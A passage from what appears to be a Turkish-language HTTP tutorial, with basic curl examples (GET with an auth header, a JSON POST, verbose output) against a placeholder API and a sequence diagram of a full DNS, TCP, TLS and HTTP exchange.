**Hızlı curl örnekleri:**
```bash
# Başlıkla GET
curl -i https://api.ornek.com/users/1 \
     -H "Authorization: Bearer <token>"

# JSON ile POST
curl -X POST https://api.ornek.com/users \
     -H "Content-Type: application/json" \
     -d '{"isim":"Ayşe","eposta":"ayse@ornek.com"}'

# Tam istek + yanıt başlıklarını gör
curl -v https://api.ornek.com/users
```

> **Tarayıcı DevTools → Network sekmesinde**: Herhangi bir isteğe tıklayarak başlıklarını, gövdesini, durum kodunu ve zamanlama şelalesini inceleyebilirsiniz.

---

## 📡 Eksiksiz Bir HTTP Değişimi

```mermaid
sequenceDiagram
    participant B as Tarayıcı
    participant D as DNS
    participant S as Sunucu
    B->>D: DNS Sorgusu (api.ornek.com)
    D-->>B: IP Adresi
    B->>S: TCP El Sıkışma (SYN)
    S-->>B: TCP El Sıkışma (SYN-ACK)
    B->>S: TCP El Sıkışma (ACK)
    B->>S: TLS El Sıkışma
    S-->>B: TLS El Sıkışma (Sertifika)
    Note over B,S: 🔒 Şifreli tünel kuruldu
    B->>S: GET /api/users/1 HTTP/1.1
    S-->>B: HTTP/1.1 200 OK + JSON gövdesi
    B->>S: TCP FIN
    S-->>B: TCP FIN-ACK
```

</details>
